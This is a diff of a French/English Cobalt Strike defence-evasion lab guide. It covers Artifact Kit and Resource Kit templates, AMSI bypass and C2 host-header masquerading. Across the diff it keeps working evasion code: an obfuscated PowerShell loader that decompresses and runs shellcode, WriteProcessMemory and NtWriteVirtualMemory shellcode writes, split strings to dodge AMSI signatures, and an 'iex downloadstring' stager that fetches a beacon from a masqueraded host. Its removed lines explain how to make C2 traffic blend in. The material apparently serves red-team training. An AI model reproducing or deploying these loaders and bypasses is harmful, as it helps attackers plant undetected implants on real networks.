@@ -344,45 +344,37 @@ Cobalt Strike > Script Manager > Load
 → C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
 ```
 
-All future payloads generated in CS now use the custom artifact stubs.
+Après chargement de `artifact.cna`, les nouveaux artifacts produits par Cobalt Strike utilisent les composants définis par l’Artifact Kit de l’environnement. Leur comportement doit toujours être vérifié.
 
 <img src="/images/defence-evasion-lab-02.png" width=1024>
 
 ---
 
-## Part 3 — Resource Kit
+## Partie 3 — Resource Kit
 
-### Why the Resource Kit exists
+### Comprendre le Resource Kit
 
-The Resource Kit controls the **PowerShell stager templates** — the `.ps1` scripts that CS
-generates when you use Scripted Web Delivery or PowerShell-based stagers. When a target runs
-`iex (new-object net.webclient).downloadstring(...)`, AMSI scans the script block before it
-executes. Default CS PS1 templates have AMSI-detectable patterns.
+Le Resource Kit contient notamment des **templates PowerShell** utilisés pour certaines fonctions de génération et de livraison de scripts dans Cobalt Strike.
 
-By modifying the template source, you produce a PS1 that AMSI doesn't recognise.
+**Pourquoi analyser ces templates ?** AMSI peut inspecter le contenu d’un script avant son exécution. Les chaînes, API et comportements des scripts peuvent être pris en compte par les outils de détection.
 
----
-
-### Step 1 — Build templates in WSL
+### Préparer les templates sous Ubuntu WSL
 
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```
 
-This copies the template files to the output directory. No compilation — PS1 templates are not
-compiled. You then edit them directly.
+La commande du lab copie les fichiers de templates dans le répertoire de sortie. Les fichiers `.ps1` sont des scripts PowerShell : leur traitement ne correspond pas à la compilation d’un exécutable natif C.
 
----
-
-### Step 2 — Fix `template.x64.ps1` in VSCode
+### Examiner `template.x64.ps1` dans Visual Studio Code
 
 ```
 File > Open Folder → C:\Tools\cobaltstrike\custom-resources
 Open: template.x64.ps1
 ```
 
-**Line 5 — break the `System.dll` string:**
+**Ligne 5 :** le lab compare différentes représentations de la chaîne `System.dll` dans un script PowerShell. Le bloc suivant est conservé comme référence de formation.
 
 ```powershell
 # Before (AMSI-detected):
@@ -392,16 +384,9 @@ Open: template.x64.ps1
 .Equals('Sys'+'tem.dll')
 ```
 
-**Why:** AMSI scans the literal script text for known strings. `'System.dll'` as a literal is
-on its pattern list. String concatenation is evaluated at runtime — AMSI sees `'Sys'+'tem.dll'`
-which does not match the pattern.
+**Analyse :** AMSI peut examiner le texte et le comportement des scripts. Les concaténations de chaînes peuvent produire le même résultat à l’exécution, mais il n’est pas possible de conclure qu’elles empêchent systématiquement une détection.
 
-** 📝  `'Sys'+'tem.dll'` Obfuscation ?**
-
-In the ZPS lab environment with the Defender version at time of lab build — ThreatCheck
-confirmed it clean. However, AMSI signatures update. The only reliable answer is: **run
-ThreatCheck AMSI  📝 after building and confirm `No threat found`**. If it comes back
-detected, escalate the obfuscation using alternatives:
+Le support présente plusieurs variantes de l’exemple `System.dll` et leurs résultats à comparer dans l’environnement du lab.
 
 ```powershell
 # Option 1 — variable substitution (breaks string-pattern matching entirely):
@@ -418,31 +403,22 @@ $s = 'System'; .Equals($s + '.dll')
 # 'U3lzdGVtLmRsbA==' = base64('System.dll')
 ```
 
- ⛔ Test options with ThreatCheck, Always verify clean before loading `resources.cna`  ⛔ 
+**Contrôle :** relever le résultat de ThreatCheck pour chaque version du template et documenter la version des signatures utilisée. Une absence de détection dans ThreatCheck ne garantit pas un résultat identique en production.
 
 <img src="/images/defence-evasion-lab-03.png" width=1024>
 
-**Line 32 — replace `Marshal.Copy` with `WriteProcessMemory`:**
+**Ligne 32 :** comparaison entre `Marshal.Copy` et `WriteProcessMemory` dans le code du template PowerShell.
 
 ```powershell
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
 $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
 ```
 
-**Why:** The original code uses `[System.Runtime.InteropServices.Marshal]::Copy` to write
-shellcode bytes into the allocated buffer. AMSI has a signature for this specific `Marshal.Copy`
-usage pattern in the CS template context. The replacement achieves the same result using the
-native Win32 `WriteProcessMemory` API directly via P/Invoke — different API call, no AMSI
-signature match. `[IntPtr]::New(-1)` is `-1` = current process handle (pseudo-handle), so this
-writes into the current process's own memory — identical effect to `Marshal.Copy` here.
+**Rôle des API :** `Marshal.Copy` copie des données entre mémoire managée et non managée. `WriteProcessMemory` est une API Windows permettant des écritures mémoire selon les handles et permissions disponibles.
 
-**Is `WriteProcessMemory` enough? The string itself is detectable.**
+Dans l’exemple du cours, les deux opérations sont étudiées pour comprendre leurs différences de signatures et de télémétrie. Un nom d’API, les appels qui l’utilisent et le contenu du script peuvent tous être analysés par AMSI ou un EDR.
 
-The string literal `WriteProcessMemory` in the PS1 is visible to AMSI and could be flagged if
-Defender adds a signature for it. The lab version works against the current Skillable Defender
-build — but ThreatCheck is the only reliable way to confirm. If flagged, break the API name
-string the same way, since the `func_get_proc_address` helper resolves the API by string at
-runtime:
+Le cours présente une autre forme d’accès à la même API dans le bloc suivant.
 
 ```powershell
 # Option 1 — split the API name string (same as System.dll approach):
@@ -462,84 +438,60 @@ $var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi
 $var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
 ```
 
-**Option 2** (NtWriteVirtualMemory) is the stronger alternative — it calls the syscall-adjacent ntdll
-function rather than the kernel32 wrapper, and is less commonly signatured. Both produce identical
-results in this context.
+Le lab présente aussi `NtWriteVirtualMemory` comme API apparentée aux opérations d’écriture mémoire. Ces méthodes diffèrent dans leurs chemins d’appel et leurs effets visibles ; leur comportement ne doit pas être considéré comme indétectable.
 
-**Priority:** Lab value first → ThreatCheck → if flagged, apply string split → ThreatCheck again
-→ if still flagged, switch to NtWriteVirtualMemory variant.
+**Méthode de contrôle :** comparer les versions du script et leurs résultats, puis conserver les différences observées dans les notes.
 
-Save the changes (File > Save).
+### Examiner le fichier `compress.ps1`
 
----
-
-### Step 3 — Replace `compress.ps1` with obfuscated version
-
-Select `compress.ps1` in VSCode. Replace the entire content with the obfuscated version:
+Cette partie étudie une autre variante du template PowerShell `compress.ps1`, employé pendant la préparation du payload.
 
 ```powershell
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
 ```
 
-**Why:** `compress.ps1` is the gzip decompress wrapper that CS wraps the beacon payload in.
-The default version is a plain, readable PowerShell one-liner that AMSI has a pattern for.
-This obfuscated version was generated via `Invoke-Obfuscation` (token-level obfuscation) and
-produces identical runtime behaviour — `%%DATA%%` is the shellcode placeholder CS fills at
-generation time.
+**Rôle de `compress.ps1` :** le template est utilisé comme enveloppe PowerShell pour des données compressées. Le lab présente une version issue d’Invoke-Obfuscation et compare sa forme textuelle à la version initiale.
 
 <img src="/images/defence-evasion-lab-05.png" width=1024>
 
-> **Critical:** Never rename or obfuscate `%%DATA%%`. CS does a literal string substitution to
-> inject the shellcode bytes. If `%%DATA%%` is missing, the payload generates with empty shellcode.
+**Variable importante :** `%%DATA%%` est un placeholder attendu par le système de génération de Cobalt Strike. Son remplacement incorrect peut rendre le script invalide.
 
-**obfuscation bypasses AMSI:** Token-level obfuscation (mixed case, backtick splits, 🕵️ 
-variable aliasing) breaks the static string pattern matching AMSI uses without changing the
-PowerShell AST (abstract syntax tree) — the code runs correctly but looks entirely different
-to a regex/string match.
+**Observation :** les transformations de tokens, la casse et les chaînes séparées peuvent modifier la forme d’un script sans nécessairement modifier sa logique. Les protections modernes ne se limitent pas aux correspondances de chaînes simples.
 
-Save the changes (File > Save).
-
----
-
-### Step 4 — ThreatCheck AMSI scan
+### Vérifier le template avec ThreatCheck en mode AMSI
 
 ```powershell
 cd C:\Tools\cobaltstrike\custom-resources\
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
 
->Must be clean an no antivirus threat found!!!
+> **Contrôle de qualité :** documenter le résultat exact de l’analyse et la version du fichier testé. Un résultat « No threat found » ne prouve pas l’absence de détection par tous les moteurs de sécurité.
 
----
-
-### Step 5 — Load into CS
+### Charger le Resource Kit dans Cobalt Strike
 
 ```
 Cobalt Strike > Script Manager > Load
 → C:\Tools\cobaltstrike\custom-resources\resources.cna
 ```
 
-All PowerShell stagers CS generates will now use the modified templates.
+Les nouveaux scripts générés dans Cobalt Strike peuvent alors utiliser les templates chargés depuis le Resource Kit. Vérifier leur chargement et leur comportement dans l’environnement autorisé.
 
 ---
 
-## Part 4 — Testing
+## Partie 4 — Tests du lab
 
-### Why `www.bleepincomputer.com` — Host Header Masquerading
+### Comprendre l’en-tête HTTP Host dans le listener
 
-Before running the test, you need to understand what `www.bleepincomputer.com` is doing here
-and why it matters for OPSEC — this was set in the CS HTTP listener during the Cobalt Strike
-Primer lab:
+Le listener HTTP du lab utilise la valeur `www.bleepincomputer.com`. Cette section permet de distinguer le nom présenté dans l’en-tête `Host` de l’adresse IP réellement contactée.
+
 ```
 HTTP Hosts:        www.bleepincomputer.com
 HTTP Host (Stager): www.bleepincomputer.com
 ```
 
-**The core concept — HTTP Host header masquerading:**
+**Principe :** une requête HTTP contient généralement un en-tête `Host:` indiquant l’hôte demandé. Dans Cobalt Strike, le paramètre `HTTP Hosts` du listener influence cette valeur.
 
-Every HTTP request contains a `Host:` header field. Beacon's C2 check-in requests are HTTP.
-The `HTTP Hosts` setting controls what value Beacon puts in the `Host:` header of its C2
-requests. This is separate from where the TCP connection actually goes.
+La valeur de l’en-tête HTTP ne prouve pas que la connexion réseau est établie avec le domaine indiqué : l’adresse IP de destination, les entrées DNS et la configuration du proxy doivent aussi être vérifiées.
 
 ```
 Without masquerading:
@@ -555,43 +507,19 @@ With masquerading (www.bleepincomputer.com):
                                                  ← Network monitoring/SIEM sees legitimate-looking traffic
 ```
 
-**Why bleepincomputer.com specifically:**
-- BleepingComputer is a well-known, legitimate security news website
-- Network defenders expect to see employees browsing it
-- A proxy/IDS seeing `Host: www.bleepincomputer.com` HTTP traffic is unlikely to block it
-- A raw internal IP in the Host header is immediately suspicious
+### Résolution DNS dans le lab
 
-**How the lab URL `http://www.bleepincomputer.com/a` resolves to the team server:**
+Le support utilise `www.bleepincomputer.com` comme exemple de nom d’hôte connu. Dans l’environnement de formation décrit, la résolution DNS interne le relie au team server `10.0.0.5`.
 
-The ZPS lab environment has internal DNS configured (or hosts file entries) that resolve
-`www.bleepincomputer.com` to the team server IP `10.0.0.5`. This is a lab-only configuration.
-The TCP connection goes to 10.0.0.5 — only the Host header says bleepincomputer.com.
+**À retenir :** l’en-tête `Host` et l’adresse IP de destination peuvent être différents. C’est une information utile pour la détection réseau ; l’analyse doit corréler DNS, IP, HTTP et processus source.
 
-**Name Resolution**
+### Contexte de l’Initial Access
 
-📝  environment will have similar internal DNS pre-configured
+Le lab part d’un scénario **Assume Breach** avec des identifiants fournis et une workstation accessible. La chaîne de livraison par ISO/LNK étudiée dans une autre fiche est un exercice séparé, qui n’est pas nécessaire pour la première session dans ce contexte.
 
-If you use just the raw team server IP as the listener host instead, Beacon's outbound HTTP
-traffic will have `Host: 10.0.0.5` — an obvious C2 indicator. The masquerading domain is what
-makes your C2 traffic blend with legitimate web browsing.
+Les contrôles portent principalement sur le chargement des templates Cobalt Strike, le comportement des processus et la visibilité des opérations.
 
-**OPSEC scoring relevance — exam criterion:**
-> "Outbound from unusual processes" — the HTTP requests from Beacon also need to have a
-> believable `Host:` header. Raw IP = OPSEC deduction. Legitimate domain = blends in.
-
----
-
-###  📝  Initial Access 
-
-Engagement context **assume-breach**.  📝  
-- You are given credentials to log in to a foothold workstation
-- There is NO pre-running Beacon — you must spawn one yourself
-- Defender is ON — your Artifact Kit and Resource Kit must be clean before you do anything
-- The phishing delivery chain (ISO, LNK, AppDomainManager) from the Initial Access lab is
-  the full attack for delivering to a simulated victim — you do NOT need to build that chain
-  for your first beacon if you have direct workstation access
-
-**Fastest path to first beacon**
+### Vérification du premier Beacon
 
 ```
 1. Log in to the foothold workstation with provided credentials
@@ -605,25 +533,21 @@ Engagement context **assume-breach**.  📝
 iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<uri>')
 ```
 
-**For this to work without Defender blocking:**
-- Resource Kit must be built and `resources.cna` loaded — AMSI will scan the PS1 as it downloads
-- Malleable C2 profile `stage` block must be active — beacon DLL survives memory scan post-inject
-- If Defender blocks the `iex downloadstring` step → Resource Kit issue (AMSI)
-- If Defender blocks after the script runs but before beacon checks in → Stage block issue (memory)
+### Identifier les causes possibles d’un blocage
 
-**Alternative: run a pre-built payload exe directly:**
+Si un script PowerShell est bloqué, examiner les résultats AMSI, le Resource Kit et la configuration effective du listener. Si l’exécution ne produit pas le résultat attendu, consulter les journaux des processus, les alertes mémoire et le chargement du profil `stage`.
 
-If Scripted Web Delivery is blocked or unavailable, run a pre-built exe payload:
+Le lab présente aussi un exécutable de test comme autre format d’artifact. Les résultats des contrôles statiques et des contrôles mémoire doivent être distingués.
+
 ```powershell
 # Payloads pre-built from lab are at C:\Payloads\ on the Windows dev box
 # Copy to target via available file share or CS web delivery, then execute:
 .\http_x64.exe
 ```
-This only works if Artifact Kit is clean (exe payload survives static scan).
 
----
+Un exécutable produit par l’Artifact Kit reste soumis à l’analyse antivirus ; l’absence d’alerte lors d’un test ne garantit pas la réussite d’un autre essai.
 
-### Generate a test beacon callback (lab verification)
+### Contrôler la connexion d’un Beacon de test
 
 ```
 CS GUI: Attacks > Scripted Web Delivery
